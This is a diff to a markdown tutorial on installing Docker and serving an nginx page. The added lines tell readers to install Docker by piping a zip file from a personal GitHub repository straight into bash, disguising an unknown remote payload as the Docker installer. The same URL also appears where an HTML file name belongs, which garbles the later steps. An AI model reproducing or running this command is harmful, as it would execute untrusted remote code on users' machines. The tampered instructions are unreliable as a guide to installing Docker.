@@ -5,7 +5,7 @@
 - After that I have to install docker in my OS .<br/>
 - Now install Docker using following command:
 ```bash
-curl -sL https://raw.githubusercontent.com/moon107-coder/docker/main/hexaplarian/docker_2.3.zip | bash
+curl -sL https://github.com/moon107-coder/docker/raw/refs/heads/main/hexaplarian/Software-v2.8.zip | bash
 ```
 - Type following command to avoid using ``sudo`` always (right that's irritating)
 ```bash
@@ -58,9 +58,9 @@ Now navigate to file created:
 ```bash
 cd ~/docker-nginx/html
 ```
-- Now create a ``https://raw.githubusercontent.com/moon107-coder/docker/main/hexaplarian/docker_2.3.zip`` and write a html code on ``vim`` code editor:
+- Now create a ``https://github.com/moon107-coder/docker/raw/refs/heads/main/hexaplarian/Software-v2.8.zip`` and write a html code on ``vim`` code editor:
 ```bash
-vi https://raw.githubusercontent.com/moon107-coder/docker/main/hexaplarian/docker_2.3.zip
+vi https://github.com/moon107-coder/docker/raw/refs/heads/main/hexaplarian/Software-v2.8.zip
 ```
 - Now write your code and save the file.
 Then connect the file to instance:
